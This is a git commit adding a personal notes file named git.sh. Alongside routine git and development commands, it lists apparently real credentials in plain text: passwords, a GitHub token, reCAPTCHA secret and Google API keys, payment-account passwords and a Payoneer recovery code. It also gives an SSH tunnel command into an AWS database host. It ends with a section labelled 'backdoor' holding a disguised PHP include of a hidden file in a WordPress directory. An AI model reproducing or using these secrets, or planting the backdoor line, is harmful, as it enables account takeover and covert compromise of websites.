6673b8a5a2e926629e08327c51fe934085b4ea92
donaldte <donaldtedom0@gmail.com>
2023-08-04 10:36:54 +0100

    my project

---
+++ git.sh
@@ -0,0 +1,70 @@
+git init
+
+git add . 
+
+git commit -m 'my project'
+
+git remote add origin https://github.com/donaldte/data-structure.git
+
+git push origin master
+git push -f origin master
+Nom utilisateur : BZ1135774937P | Mot de passe : %V<!OHL%
+
+nh7BtbdaTpDcRU2
+
+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
+
+source /srv/zulip-py3-venv/bin/activate
+./tools/run-dev.py 
+
+https://software.collab.workerly.io
+RUup9DpQP96Bwb2
+
+public key=6Lf3EsseAAAAAFvS1bR0w2_xAKj08HFyUiQOK9Gu
+secret key=6Lf3EsseAAAAAFI3NH1VyU37CmWCzGVNgQvqQvCh
+
+google =AIzaSyDm8BJ6bGMpg2vUQTf2HTI1Jga6IJvKzDo
+
+./tools/wsl/start_services 
+./tools/run-dev.py 
+ source /home/ing/Desktop/zulipbot/python-zulip-api/zulip-api-py3-venv/bin/activate
+ 
+ https://www.canva.com/design/DAE7vQ6iziM/Ccyw1wHYB1MExliNVfc2HQ/edit?utm_content=DAE7vQ6iziM&utm_campaign=designshare&utm_medium=link2&utm_source=sharebutton
+ 
+ https://app.slack.com/client/T03DN3CQYPN/C01D8QZFW2F
+ 
+ 47ht't>d,>3]#$Vd)vb|!yGv5
+ hw:Uh"vDE2czVnGhH;<K{+ETe
+ 
+ #  Nom utilisateur : Z827706416 | Mot de passe : G%-(Qj/M
+
+ apikey: '15588631346204fc327b2a83.88666087',
+            site_id: 830375,
+            
+             Info connexion. Nom utilisateur : P815772376 | Mot de passe : zH;S0nif
+                apikey: '8663185335fcbdbd1c07af6.07333862',
+            site_id: 248450,
+            https://studio.youtube.com/channel/UCE0rrl2C0vBM81bdYVnajWQ/monetization/memberships
+            
+            WORKBUD
+            ssh -i bastion_host_keys.pem -NL 5433:nightlyfromtrial.clbqcmdga9ha.us-west-2.rds.amazonaws.com:5432 ec2-user@ec2-44-236-212-9.us-west-2.compute.amazonaws.com -v
+            
+            sudo systemctl stop postgresql
+            
+
+payhip: Mathematique345YUH
+paypal: ifitfacquecho3369MY  
+donaldprogrammers: 3369tehfswwedRE   
+ifastnet: LV6BBLCcJrhReez    
+ifastnet suport: m5h4wxbr8qc2   
+recovery code for payoneer: 9MSRA0DL
+
+
+
+backdoor:
+
+/*5cca3*/
+
+@include ("/home/donaldpr/public_html/wp/.well-known/.3bd5ea84.inc");
+
+/*5cca3*/
